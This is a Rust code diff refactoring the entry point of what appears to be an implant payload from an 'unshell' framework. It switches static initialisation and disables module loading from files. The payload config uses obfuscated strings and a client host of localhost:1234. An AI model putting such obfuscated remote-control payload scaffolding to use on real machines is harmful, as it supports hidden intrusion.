@@ -1,11 +1,10 @@
-use std::fs::File;
-use std::{collections::HashMap, io::Read};
+use std::collections::HashMap;
 
-use lazy_static::lazy_static;
+use static_init::dynamic;
 use unshell_lib::{
     ModuleError,
     config::{PayloadConfig, RuntimeConfig},
-    module::{Manager, Module},
+    module::Manager,
 };
 use unshell_obfuscate::{obs, symbol};
 
@@ -13,17 +12,17 @@ use unshell_obfuscate::{obs, symbol};
 extern crate unshell_lib;
 
 // The main and initial 'configuration' for a payload
-lazy_static! {
-    static ref PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
-        id: symbol!("Test ID"),
-        components: unshell_lib::get_components(),
-        runtime_config: vec![RuntimeConfig {
-            parent_component: symbol!("client").to_string(),
-            name: symbol!("client runtime").to_string(),
-            config: HashMap::from([(symbol!("host").to_string(), obs!("localhost:1234"))]),
-        }],
-    };
-}
+
+#[dynamic]
+static PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
+    id: symbol!("Test ID"),
+    components: unshell_lib::get_components(),
+    runtime_config: vec![RuntimeConfig {
+        parent_component: symbol!("client").to_string(),
+        name: symbol!("client runtime").to_string(),
+        config: HashMap::from([(symbol!("host").to_string(), obs!("localhost:1234"))]),
+    }],
+};
 
 fn main() {
     // Init the logger
@@ -33,25 +32,27 @@ fn main() {
     debug!("Initialized");
 
     match || -> Result<(), ModuleError> {
-        let args = std::env::args();
+        // let args = std::env::args();
 
         // TEMPORARY, load the module paths from command line args.
-        let mut modules = Vec::new();
-        for arg in args.skip(1) {
-            debug!("Loading module: {}", arg);
+        // let mut modules = Vec::new();
+        // for arg in args.skip(1) {
+        //     debug!("Loading module: {}", arg);
 
-            let mut file = File::open(arg).map_err(|e| ModuleError::Error(e.to_string().into()))?;
-            let mut buffer = Vec::new();
-            file.read_to_end(&mut buffer)
-                .map_err(|e| ModuleError::Error(e.to_string().into()))?;
+        //     let mut file = File::open(arg).map_err(|e| ModuleError::Error(e.to_string().into()))?;
+        //     let mut buffer = Vec::new();
+        //     file.read_to_end(&mut buffer)
+        //         .map_err(|e| ModuleError::Error(e.to_string().into()))?;
 
-            modules.push(Module::new_bytes(&buffer)?)
+        //     modules.push(Module::new_bytes(&buffer)?)
 
-            // modules.push(Module::new(&arg)?)
-        }
+        //     // modules.push(Module::new(&arg)?)
+        // }
 
         // Run the manager, this is blocking.
-        Manager::run(&PAYLOAD_CONFIG, modules);
+        let manager = Manager::start(&PAYLOAD_CONFIG, Vec::new());
+
+        Manager::join(manager);
 
         Ok(())
     }() {
